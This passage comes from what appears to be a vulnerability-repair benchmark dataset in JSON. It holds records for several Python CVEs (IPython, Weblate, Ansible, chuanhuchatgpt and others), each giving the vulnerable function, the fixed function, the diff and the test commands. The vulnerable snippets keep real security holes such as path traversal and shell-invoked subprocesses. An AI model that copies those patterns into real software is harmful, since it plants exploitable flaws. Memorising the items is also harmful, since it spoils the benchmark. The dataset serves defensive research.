        "snippet": "def _start_program(args: List[str], local_env: Dict[str, str]) -> subprocess.Popen:\n    \"\"\"\n    Start the program where the path is the first item of the ``args`` array argument.\n\n    Parameters\n    ----------\n    args : List[str]\n        List of arguments to be passed to the program. The first list's item shall\n        be the program path.\n    local_env : Dict[str,str]\n        Environment variables to be passed to the program.\n\n    Returns\n    -------\n    subprocess.Popen\n        The subprocess object.\n    \"\"\"\n    return subprocess.Popen(\n        args,\n        shell=os.name != \"nt\",\n        stdin=subprocess.DEVNULL,\n        stdout=subprocess.DEVNULL,\n        stderr=subprocess.DEVNULL,\n        env=local_env,\n    )\n\n"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_385_1",
        "commit": "f82346b9432b06532e84f3278125f5879b4e9f3f",
        "file_path": "src/ansys/geometry/core/connection/product_instance.py",
        "start_line": 170,
        "end_line": 314,
        "snippet": "def prepare_and_start_backend(\n    backend_type: BackendType,\n    product_version: int = None,\n    host: str = \"localhost\",\n    port: int = None,\n    enable_trace: bool = False,\n    log_level: int = 2,\n    api_version: ApiVersions = ApiVersions.LATEST,\n    timeout: int = 150,\n    manifest_path: str = None,\n    logs_folder: str = None,\n    hidden: bool = False,\n) -> \"Modeler\":\n    \"\"\"\n    Start the requested service locally using the ``ProductInstance`` class.\n\n    When calling this method, a standalone service or product session is started.\n    By default, if an endpoint is specified (by defining `host` and `port` parameters)\n    but the endpoint is not available, the startup will fail. Otherwise, it will try to\n    launch its own service.\n\n    Parameters\n    ----------\n    product_version: ``int``, optional\n        The product version to be started. Goes from v23.2.1 to\n        the latest. Default is ``None``.\n        If a specific product version is requested but not installed locally,\n        a SystemError will be raised.\n    host: str, optional\n        IP address at which the Geometry service will be deployed. By default,\n        its value will be ``localhost``.\n    port : int, optional\n        Port at which the Geometry service will be deployed. By default, its\n        value will be ``None``.\n    enable_trace : bool, optional\n        Boolean enabling the logs trace on the Geometry service console window.\n        By default its value is ``False``.\n    log_level : int, optional\n        Backend's log level from 0 to 3:\n            0: Chatterbox\n            1: Debug\n            2: Warning\n            3: Error\n\n        The default is ``2`` (Warning).\n    api_version: ``ApiVersions``, optional\n        The backend's API version to be used at runtime. Goes from API v21 to\n        the latest. Default is ``ApiVersions.LATEST``.\n    timeout : int, optional\n        Timeout for starting the backend startup process. The default is 150.\n    manifest_path : str, optional\n        Used to specify a manifest file path for the ApiServerAddin. This way,\n        it is possible to run an ApiServerAddin from a version an older product\n        version. Only applicable for Ansys Discovery and Ansys SpaceClaim.\n    logs_folder : sets the backend's logs folder path. If nothing is defined,\n        the backend will use its default path.\n    hidden : starts the product hiding its UI. Default is ``False``.\n\n    Raises\n    ------\n    ConnectionError\n        If the specified endpoint is already in use, a connection error will be raised.\n    SystemError\n        If there is not an Ansys product 23.2 version or later installed\n        or if a specific product's version is requested but not installed locally then\n        a SystemError will be raised.\n\n    Returns\n    -------\n    Modeler\n        Instance of the Geometry service.\n    \"\"\"\n    from ansys.geometry.core.modeler import Modeler\n\n    if os.name != \"nt\":  # pragma: no cover\n        raise RuntimeError(\"Method 'prepare_and_start_backend' is only available on Windows.\")\n\n    port = _check_port_or_get_one(port)\n    installations = get_available_ansys_installations()\n    if product_version != None:\n        _check_version_is_available(product_version, installations)\n    else:\n        product_version = get_latest_ansys_installation()[0]\n        _check_minimal_versions(product_version)\n\n    args = []\n    env_copy = _get_common_env(\n        host=host,\n        port=port,\n        enable_trace=enable_trace,\n        log_level=log_level,\n        logs_folder=logs_folder,\n    )\n\n    if backend_type == BackendType.DISCOVERY:\n        args.append(os.path.join(installations[product_version], DISCOVERY_FOLDER, DISCOVERY_EXE))\n        if hidden is True:\n            args.append(BACKEND_DISCOVERY_HIDDEN)\n\n        # Here begins the spaceclaim arguments.\n        args.append(BACKEND_SPACECLAIM_OPTIONS)\n        args.append(\n            BACKEND_ADDIN_MANIFEST_ARGUMENT\n            + _manifest_path_provider(product_version, installations, manifest_path)\n        )\n        env_copy[BACKEND_API_VERSION_VARIABLE] = str(api_version)\n\n    elif backend_type == BackendType.SPACECLAIM:\n        args.append(os.path.join(installations[product_version], SPACECLAIM_FOLDER, SPACECLAIM_EXE))\n        if hidden is True:\n            args.append(BACKEND_SPACECLAIM_HIDDEN)\n            args.append(BACKEND_SPLASH_OFF)\n        args.append(\n            BACKEND_ADDIN_MANIFEST_ARGUMENT\n            + _manifest_path_provider(product_version, installations, manifest_path)\n        )\n        env_copy[BACKEND_API_VERSION_VARIABLE] = str(api_version)\n        env_copy[BACKEND_SPACECLAIM_HIDDEN_ENVVAR_KEY] = BACKEND_SPACECLAIM_HIDDEN_ENVVAR_VALUE\n\n    elif backend_type == BackendType.WINDOWS_SERVICE:\n        latest_version = get_latest_ansys_installation()[0]\n        args.append(\n            os.path.join(\n                installations[latest_version], WINDOWS_GEOMETRY_SERVICE_FOLDER, GEOMETRY_SERVICE_EXE\n            )\n        )\n    else:\n        raise RuntimeError(\n            f\"Cannot connect to backend {backend_type.name} using ``prepare_and_start_backend()``\"\n        )\n\n    LOG.info(f\"Launching ProductInstance for {backend_type.name}\")\n    LOG.debug(f\"Args: {args}\")\n    LOG.debug(f\"Environment variables: {env_copy}\")\n\n    instance = ProductInstance(_start_program(args, env_copy).pid)\n\n    # Verify that the backend is ready to accept connections\n    # before returning the Modeler instance.\n    LOG.info(\"Waiting for backend to be ready...\")\n    _wait_for_backend(host, port, timeout)\n\n    return Modeler(\n        host=host, port=port, timeout=timeout, product_instance=instance, backend_type=backend_type\n    )"
      },
      {
        "id": "fix_py_385_2",
        "commit": "f82346b9432b06532e84f3278125f5879b4e9f3f",
        "file_path": "src/ansys/geometry/core/connection/product_instance.py",
        "start_line": 406,
        "end_line": 429,
        "snippet": "def _start_program(args: List[str], local_env: Dict[str, str]) -> subprocess.Popen:\n    \"\"\"\n    Start the program where the path is the first item of the ``args`` array argument.\n\n    Parameters\n    ----------\n    args : List[str]\n        List of arguments to be passed to the program. The first list's item shall\n        be the program path.\n    local_env : Dict[str,str]\n        Environment variables to be passed to the program.\n\n    Returns\n    -------\n    subprocess.Popen\n        The subprocess object.\n    \"\"\"\n    return subprocess.Popen(\n        args,\n        stdin=subprocess.DEVNULL,\n        stdout=subprocess.DEVNULL,\n        stderr=subprocess.DEVNULL,\n        env=local_env,\n    )"
      }
    ],
    "vul_patch": "--- a/src/ansys/geometry/core/connection/product_instance.py\n+++ b/src/ansys/geometry/core/connection/product_instance.py\n@@ -72,6 +72,9 @@\n     \"\"\"\n     from ansys.geometry.core.modeler import Modeler\n \n+    if os.name != \"nt\":  # pragma: no cover\n+        raise RuntimeError(\"Method 'prepare_and_start_backend' is only available on Windows.\")\n+\n     port = _check_port_or_get_one(port)\n     installations = get_available_ansys_installations()\n     if product_version != None:\n\n--- a/src/ansys/geometry/core/connection/product_instance.py\n+++ b/src/ansys/geometry/core/connection/product_instance.py\n@@ -17,10 +17,8 @@\n     \"\"\"\n     return subprocess.Popen(\n         args,\n-        shell=os.name != \"nt\",\n         stdin=subprocess.DEVNULL,\n         stdout=subprocess.DEVNULL,\n         stderr=subprocess.DEVNULL,\n         env=local_env,\n     )\n-\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-21699",
    "cve_description": "IPython (Interactive Python) is a command shell for interactive computing in multiple programming languages, originally developed for the Python programming language. Affected versions are subject to an arbitrary code execution vulnerability achieved by not properly managing cross user temporary files. This vulnerability allows one user to run code as another on the same machine. All users are advised to upgrade.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/ipython/ipython",
    "patch_url": [
      "https://github.com/ipython/ipython/commit/46a51ed69cdf41b4333943d9ceeb945c4ede5668",
      "https://github.com/ipython/ipython/commit/5fa1e409d2dc126c456510c16ece18e08b524e5b",
      "https://github.com/ipython/ipython/commit/a06ca837273271b4acb82c29be97c0b6d12a30ea",
      "https://github.com/ipython/ipython/commit/67ca2b3aa9039438e6f80e3fccca556f26100b4d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_13_1",
        "commit": "50b3d1f",
        "file_path": "IPython/core/profiledir.py",
        "start_line": 184,
        "end_line": 209,
        "snippet": "    def find_profile_dir_by_name(cls, ipython_dir, name=u'default', config=None):\n        \"\"\"Find an existing profile dir by profile name, return its ProfileDir.\n\n        This searches through a sequence of paths for a profile dir.  If it\n        is not found, a :class:`ProfileDirError` exception will be raised.\n\n        The search path algorithm is:\n        1. ``os.getcwd()``\n        2. ``ipython_dir``\n\n        Parameters\n        ----------\n        ipython_dir : unicode or str\n            The IPython directory to use.\n        name : unicode or str\n            The name of the profile.  The name of the profile directory\n            will be \"profile_<profile>\".\n        \"\"\"\n        dirname = u'profile_' + name\n        paths = [os.getcwd(), ipython_dir]\n        for p in paths:\n            profile_dir = os.path.join(p, dirname)\n            if os.path.isdir(profile_dir):\n                return cls(location=profile_dir, config=config)\n        else:\n            raise ProfileDirError('Profile directory not found in paths: %s' % dirname)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_13_1",
        "commit": "46a51ed",
        "file_path": "IPython/core/profiledir.py",
        "start_line": 184,
        "end_line": 209,
        "snippet": "    def find_profile_dir_by_name(cls, ipython_dir, name=u'default', config=None):\n        \"\"\"Find an existing profile dir by profile name, return its ProfileDir.\n\n        This searches through a sequence of paths for a profile dir.  If it\n        is not found, a :class:`ProfileDirError` exception will be raised.\n\n        The search path algorithm is:\n        1. ``os.getcwd()`` # removed for security reason.\n        2. ``ipython_dir``\n\n        Parameters\n        ----------\n        ipython_dir : unicode or str\n            The IPython directory to use.\n        name : unicode or str\n            The name of the profile.  The name of the profile directory\n            will be \"profile_<profile>\".\n        \"\"\"\n        dirname = u'profile_' + name\n        paths = [ipython_dir]\n        for p in paths:\n            profile_dir = os.path.join(p, dirname)\n            if os.path.isdir(profile_dir):\n                return cls(location=profile_dir, config=config)\n        else:\n            raise ProfileDirError('Profile directory not found in paths: %s' % dirname)"
      }
    ],
    "vul_patch": "--- a/IPython/core/profiledir.py\n+++ b/IPython/core/profiledir.py\n@@ -5,7 +5,7 @@\n         is not found, a :class:`ProfileDirError` exception will be raised.\n \n         The search path algorithm is:\n-        1. ``os.getcwd()``\n+        1. ``os.getcwd()`` # removed for security reason.\n         2. ``ipython_dir``\n \n         Parameters\n@@ -17,7 +17,7 @@\n             will be \"profile_<profile>\".\n         \"\"\"\n         dirname = u'profile_' + name\n-        paths = [os.getcwd(), ipython_dir]\n+        paths = [ipython_dir]\n         for p in paths:\n             profile_dir = os.path.join(p, dirname)\n             if os.path.isdir(profile_dir):\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21699:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/ipython\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-21699/bin/python -W ignore::UserWarning -m pytest IPython/tests/cve.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21699:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/ipython\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-21699/bin/python -m pytest -v IPython/core/tests/test_profile.py IPython/core/tests/test_application.py"
  },
  {
    "cve_id": "CVE-2025-32428",
    "cve_description": "Jupyter Remote Desktop Proxy allows you to run a Linux Desktop on a JupyterHub. jupyter-remote-desktop-proxy was meant to rely on UNIX sockets readable only by the current user since version 3.0.0, but when used with TigerVNC, the VNC server started by jupyter-remote-desktop-proxy were still accessible via the network. This vulnerability does not affect users having TurboVNC as the vncserver executable. This issue is fixed in 3.0.1.",
    "cwe_info": {
      "CWE-668": {
        "name": "Exposure of Resource to Wrong Sphere",
        "description": "The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource."
      }
    },
    "repo": "https://github.com/jupyterhub/jupyter-remote-desktop-proxy",
    "patch_url": [
      "https://github.com/jupyterhub/jupyter-remote-desktop-proxy/commit/7dd54c25a4253badd8ea68895437e5a66a59090d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_287_1",
        "commit": "5a46ef7",
        "file_path": "jupyter_remote_desktop_proxy/setup_websockify.py",
        "start_line": 8,
        "end_line": 46,
        "snippet": "def setup_websockify():\n    vncserver = which('vncserver')\n    if not vncserver:\n        raise RuntimeError(\n            \"vncserver executable not found, please install a VNC server\"\n        )\n\n    # {unix_socket} is expanded by jupyter-server-proxy\n    vnc_args = [vncserver, '-rfbunixpath', '{unix_socket}']\n\n    xstartup = os.getenv(\"JUPYTER_REMOTE_DESKTOP_PROXY_XSTARTUP\")\n    if not xstartup and not os.path.exists(os.path.expanduser('~/.vnc/xstartup')):\n        xstartup = os.path.join(HERE, 'share/xstartup')\n    if xstartup:\n        vnc_args.extend(['-xstartup', xstartup])\n\n    vnc_command = shlex.join(\n        vnc_args\n        + [\n            '-verbose',\n            '-fg',\n            '-geometry',\n            '1680x1050',\n            '-SecurityTypes',\n            'None',\n        ]\n    )\n\n    return {\n        'command': ['/bin/sh', '-c', f'cd {os.getcwd()} && {vnc_command}'],\n        'timeout': 30,\n        'new_browser_window': True,\n        # We want the launcher entry to point to /desktop/, not to /desktop-websockify/\n        # /desktop/ is the user facing URL, while /desktop-websockify/ now *only* serves\n        # websockets.\n        \"launcher_entry\": {\"title\": \"Desktop\", \"path_info\": \"desktop\"},\n        \"unix_socket\": True,\n        \"raw_socket_proxy\": True,\n    }"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_287_1",
        "commit": "7dd54c25a4253badd8ea68895437e5a66a59090d",
        "file_path": "jupyter_remote_desktop_proxy/setup_websockify.py",
        "start_line": 8,
        "end_line": 65,
        "snippet": "def setup_websockify():\n    vncserver = which('vncserver')\n    if not vncserver:\n        raise RuntimeError(\n            \"vncserver executable not found, please install a VNC server\"\n        )\n\n    # TurboVNC and TigerVNC share the same origin and both use a Perl script\n    # as the executable vncserver. We can determine if vncserver is TigerVNC\n    # by searching tigervnc string in the Perl script.\n    #\n    # The content of the vncserver executable can differ depending on how\n    # TigerVNC and TurboVNC has been distributed. Below are files known to be\n    # read in some situations:\n    #\n    # - https://github.com/TigerVNC/tigervnc/blob/v1.13.1/unix/vncserver/vncserver.in\n    # - https://github.com/TurboVNC/turbovnc/blob/3.1.1/unix/vncserver.in\n    #\n    with open(vncserver) as vncserver_file:\n        vncserver_file_text = vncserver_file.read().casefold()\n    is_turbovnc = \"turbovnc\" in vncserver_file_text\n\n    # {unix_socket} is expanded by jupyter-server-proxy\n    vnc_args = [vncserver, '-rfbunixpath', \"{unix_socket}\", \"-rfbport\", \"-1\"]\n    if is_turbovnc:\n        # turbovnc doesn't handle being passed -rfbport -1, but turbovnc also\n        # defaults to not opening a TCP port which is what we want to ensure\n        vnc_args = [vncserver, '-rfbunixpath', \"{unix_socket}\"]\n\n    xstartup = os.getenv(\"JUPYTER_REMOTE_DESKTOP_PROXY_XSTARTUP\")\n    if not xstartup and not os.path.exists(os.path.expanduser('~/.vnc/xstartup')):\n        xstartup = os.path.join(HERE, 'share/xstartup')\n    if xstartup:\n        vnc_args.extend(['-xstartup', xstartup])\n\n    vnc_command = shlex.join(\n        vnc_args\n        + [\n            '-verbose',\n            '-fg',\n            '-geometry',\n            '1680x1050',\n            '-SecurityTypes',\n            'None',\n        ]\n    )\n\n    return {\n        'command': ['/bin/sh', '-c', f'cd {os.getcwd()} && {vnc_command}'],\n        'timeout': 30,\n        'new_browser_window': True,\n        # We want the launcher entry to point to /desktop/, not to /desktop-websockify/\n        # /desktop/ is the user facing URL, while /desktop-websockify/ now *only* serves\n        # websockets.\n        \"launcher_entry\": {\"title\": \"Desktop\", \"path_info\": \"desktop\"},\n        \"unix_socket\": True,\n        \"raw_socket_proxy\": True,\n    }"
      }
    ],
    "vul_patch": "--- a/jupyter_remote_desktop_proxy/setup_websockify.py\n+++ b/jupyter_remote_desktop_proxy/setup_websockify.py\n@@ -5,8 +5,27 @@\n             \"vncserver executable not found, please install a VNC server\"\n         )\n \n+    # TurboVNC and TigerVNC share the same origin and both use a Perl script\n+    # as the executable vncserver. We can determine if vncserver is TigerVNC\n+    # by searching tigervnc string in the Perl script.\n+    #\n+    # The content of the vncserver executable can differ depending on how\n+    # TigerVNC and TurboVNC has been distributed. Below are files known to be\n+    # read in some situations:\n+    #\n+    # - https://github.com/TigerVNC/tigervnc/blob/v1.13.1/unix/vncserver/vncserver.in\n+    # - https://github.com/TurboVNC/turbovnc/blob/3.1.1/unix/vncserver.in\n+    #\n+    with open(vncserver) as vncserver_file:\n+        vncserver_file_text = vncserver_file.read().casefold()\n+    is_turbovnc = \"turbovnc\" in vncserver_file_text\n+\n     # {unix_socket} is expanded by jupyter-server-proxy\n-    vnc_args = [vncserver, '-rfbunixpath', '{unix_socket}']\n+    vnc_args = [vncserver, '-rfbunixpath', \"{unix_socket}\", \"-rfbport\", \"-1\"]\n+    if is_turbovnc:\n+        # turbovnc doesn't handle being passed -rfbport -1, but turbovnc also\n+        # defaults to not opening a TCP port which is what we want to ensure\n+        vnc_args = [vncserver, '-rfbunixpath', \"{unix_socket}\"]\n \n     xstartup = os.getenv(\"JUPYTER_REMOTE_DESKTOP_PROXY_XSTARTUP\")\n     if not xstartup and not os.path.exists(os.path.expanduser('~/.vnc/xstartup')):\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-7962",
    "cve_description": "An arbitrary file read vulnerability exists in gaizhenbiao/chuanhuchatgpt version 20240628 due to insufficient validation when loading prompt template files. An attacker can read any file that matches specific criteria using an absolute path. The file must not have a .json extension and, except for the first line, every other line must contain commas. This vulnerability allows reading parts of format-compliant files, including code and log files, which may contain highly sensitive information such as account credentials.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/gaizhenbiao/chuanhuchatgpt",
    "patch_url": [
      "https://github.com/gaizhenbiao/chuanhuchatgpt/commit/2836fd1db3efcd5ede63c0e7fbbdf677730dbb51"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_369_1",
        "commit": "c2c2b86d14e28d3b106f067ebb9b44f8acfbff1e",
        "file_path": "modules/utils.py",
        "start_line": 520,
        "end_line": 540,
        "snippet": "def load_template(filename, mode=0):\n    logging.debug(f\"\\u52a0\\u8f7d\\u6a21\\u677f\\u6587\\u4ef6{filename}\\uff0c\\u6a21\\u5f0f\\u4e3a{mode}\\uff080\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\u548c\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c1\\u4e3a\\u8fd4\\u56de\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c2\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\uff09\")\n    lines = []\n    if filename.endswith(\".json\"):\n        with open(os.path.join(TEMPLATES_DIR, filename), \"r\", encoding=\"utf8\") as f:\n            lines = json.load(f)\n        lines = [[i[\"act\"], i[\"prompt\"]] for i in lines]\n    else:\n        with open(\n            os.path.join(TEMPLATES_DIR, filename), \"r\", encoding=\"utf8\"\n        ) as csvfile:\n            reader = csv.reader(csvfile)\n            lines = list(reader)\n        lines = lines[1:]\n    if mode == 1:\n        return sorted_by_pinyin([row[0] for row in lines])\n    elif mode == 2:\n        return {row[0]: row[1] for row in lines}\n    else:\n        choices = sorted_by_pinyin([row[0] for row in lines])\n        return {row[0]: row[1] for row in lines}, gr.Dropdown(choices=choices)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_369_1",
        "commit": "2836fd1db3efcd5ede63c0e7fbbdf677730dbb51",
        "file_path": "modules/utils.py",
        "start_line": 520,
        "end_line": 544,
        "snippet": "def load_template(filename, mode=0):\n    logging.debug(f\"\\u52a0\\u8f7d\\u6a21\\u677f\\u6587\\u4ef6{filename}\\uff0c\\u6a21\\u5f0f\\u4e3a{mode}\\uff080\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\u548c\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c1\\u4e3a\\u8fd4\\u56de\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c2\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\uff09\")\n    lines = []\n    template_file_path = os.path.join(TEMPLATES_DIR, filename)\n    # check if template_file_path is inside TEMPLATES_DIR\n    if not os.path.realpath(template_file_path).startswith(os.path.realpath(TEMPLATES_DIR)):\n        return \"Invalid template file path\"\n    if filename.endswith(\".json\"):\n        with open(template_file_path, \"r\", encoding=\"utf8\") as f:\n            lines = json.load(f)\n        lines = [[i[\"act\"], i[\"prompt\"]] for i in lines]\n    else:\n        with open(\n            template_file_path, \"r\", encoding=\"utf8\"\n        ) as csvfile:\n            reader = csv.reader(csvfile)\n            lines = list(reader)\n        lines = lines[1:]\n    if mode == 1:\n        return sorted_by_pinyin([row[0] for row in lines])\n    elif mode == 2:\n        return {row[0]: row[1] for row in lines}\n    else:\n        choices = sorted_by_pinyin([row[0] for row in lines])\n        return {row[0]: row[1] for row in lines}, gr.Dropdown(choices=choices)"
      }
    ],
    "vul_patch": "--- a/modules/utils.py\n+++ b/modules/utils.py\n@@ -1,13 +1,17 @@\n def load_template(filename, mode=0):\n     logging.debug(f\"\\u52a0\\u8f7d\\u6a21\\u677f\\u6587\\u4ef6{filename}\\uff0c\\u6a21\\u5f0f\\u4e3a{mode}\\uff080\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\u548c\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c1\\u4e3a\\u8fd4\\u56de\\u4e0b\\u62c9\\u83dc\\u5355\\uff0c2\\u4e3a\\u8fd4\\u56de\\u5b57\\u5178\\uff09\")\n     lines = []\n+    template_file_path = os.path.join(TEMPLATES_DIR, filename)\n+    # check if template_file_path is inside TEMPLATES_DIR\n+    if not os.path.realpath(template_file_path).startswith(os.path.realpath(TEMPLATES_DIR)):\n+        return \"Invalid template file path\"\n     if filename.endswith(\".json\"):\n-        with open(os.path.join(TEMPLATES_DIR, filename), \"r\", encoding=\"utf8\") as f:\n+        with open(template_file_path, \"r\", encoding=\"utf8\") as f:\n             lines = json.load(f)\n         lines = [[i[\"act\"], i[\"prompt\"]] for i in lines]\n     else:\n         with open(\n-            os.path.join(TEMPLATES_DIR, filename), \"r\", encoding=\"utf8\"\n+            template_file_path, \"r\", encoding=\"utf8\"\n         ) as csvfile:\n             reader = csv.reader(csvfile)\n             lines = list(reader)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2017-5537",
    "cve_description": "The password reset form in Weblate before 2.10.1 provides different error messages depending on whether the email address is associated with an account, which allows remote attackers to enumerate user accounts via a series of requests.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/WeblateOrg/weblate",
    "patch_url": [
      "https://github.com/WeblateOrg/weblate/commit/abe0d2a29a1d8e896bfe829c8461bf8b391f1079"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_345_1",
        "commit": "e95eacf59f781d8a993be8a23b58e27afdacd9c7",
        "file_path": "weblate/accounts/views.py",
        "start_line": 554,
        "end_line": 585,
        "snippet": "def reset_password(request):\n    '''\n    Password reset handling.\n    '''\n    if 'email' not in load_backends(BACKENDS).keys():\n        messages.error(\n            request,\n            _('Can not reset password, email authentication is disabled!')\n        )\n        return redirect('login')\n\n    if request.method == 'POST':\n        form = ResetForm(request.POST)\n        if form.is_valid():\n            # Force creating new session\n            request.session.create()\n            if request.user.is_authenticated():\n                logout(request)\n\n            request.session['password_reset'] = True\n            return complete(request, 'email')\n    else:\n        form = ResetForm()\n\n    return render(\n        request,\n        'accounts/reset.html',\n        {\n            'title': _('Password reset'),\n            'form': form,\n        }\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_345_1",
        "commit": "abe0d2a29a1d8e896bfe829c8461bf8b391f1079",
        "file_path": "weblate/accounts/views.py",
        "start_line": 554,
        "end_line": 587,
        "snippet": "def reset_password(request):\n    '''\n    Password reset handling.\n    '''\n    if 'email' not in load_backends(BACKENDS).keys():\n        messages.error(\n            request,\n            _('Can not reset password, email authentication is disabled!')\n        )\n        return redirect('login')\n\n    if request.method == 'POST':\n        form = ResetForm(request.POST)\n        if form.is_valid():\n            # Force creating new session\n            request.session.create()\n            if request.user.is_authenticated():\n                logout(request)\n\n            request.session['password_reset'] = True\n            return complete(request, 'email')\n        else:\n            return redirect('email-sent')\n    else:\n        form = ResetForm()\n\n    return render(\n        request,\n        'accounts/reset.html',\n        {\n            'title': _('Password reset'),\n            'form': form,\n        }\n    )"
      }
    ],
    "vul_patch": "--- a/weblate/accounts/views.py\n+++ b/weblate/accounts/views.py\n@@ -19,6 +19,8 @@\n \n             request.session['password_reset'] = True\n             return complete(request, 'email')\n+        else:\n+            return redirect('email-sent')\n     else:\n         form = ResetForm()\n \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-10684",
    "cve_description": "A flaw was found in Ansible Engine, all versions 2.7.x, 2.8.x and 2.9.x prior to 2.7.17, 2.8.9 and 2.9.6 respectively, when using ansible_facts as a subkey of itself and promoting it to a variable when inject is enabled, overwriting the ansible_facts after the clean. An attacker could take advantage of this by altering the ansible_facts, such as ansible_hosts, users and any other key data which would lead into privilege escalation or code injection.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/a9d2ceafe429171c0e2ad007058b88bae57c74ce",
      "https://github.com/ansible/ansible/commit/5eabf7bb93c9bfc375b806a2b1f623d650cddc2b",
      "https://github.com/ansible/ansible/commit/0b4788a71fc7d24ffa957a94ee5e23d6a9733ab0",
      "https://github.com/ansible/ansible/commit/1d0d2645eed36ac4e17052ab4eacf240132d96fb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_406_1",
        "commit": "97e51797454b97bfb9447b3b7dc926be530ae19e",
        "file_path": "lib/ansible/vars/clean.py",
        "start_line": 168,
        "end_line": 178,
        "snippet": "def namespace_facts(facts):\n    ''' return all facts inside 'ansible_facts' w/o an ansible_ prefix '''\n    deprefixed = {}\n    for k in facts:\n        if k in ('ansible_local',):\n            # exceptions to 'deprefixing'\n            deprefixed[k] = module_response_deepcopy(facts[k])\n        else:\n            deprefixed[k.replace('ansible_', '', 1)] = module_response_deepcopy(facts[k])\n\n    return {'ansible_facts': deprefixed}"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_406_1",
        "commit": "a9d2ceafe429171c0e2ad007058b88bae57c74ce",
        "file_path": "lib/ansible/vars/clean.py",
        "start_line": 167,
        "end_line": 176,
        "snippet": "def namespace_facts(facts):\n    ''' return all facts inside 'ansible_facts' w/o an ansible_ prefix '''\n    deprefixed = {}\n    for k in facts:\n        if k.startswith('ansible_') and k not in ('ansible_local',):\n            deprefixed[k[8:]] = module_response_deepcopy(facts[k])\n        else:\n            deprefixed[k] = module_response_deepcopy(facts[k])\n\n    return {'ansible_facts': deprefixed}"
      }
    ],
    "vul_patch": "--- a/lib/ansible/vars/clean.py\n+++ b/lib/ansible/vars/clean.py\n@@ -2,10 +2,9 @@\n     ''' return all facts inside 'ansible_facts' w/o an ansible_ prefix '''\n     deprefixed = {}\n     for k in facts:\n-        if k in ('ansible_local',):\n-            # exceptions to 'deprefixing'\n+        if k.startswith('ansible_') and k not in ('ansible_local',):\n+            deprefixed[k[8:]] = module_response_deepcopy(facts[k])\n+        else:\n             deprefixed[k] = module_response_deepcopy(facts[k])\n-        else:\n-            deprefixed[k.replace('ansible_', '', 1)] = module_response_deepcopy(facts[k])\n \n     return {'ansible_facts': deprefixed}\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-22205",
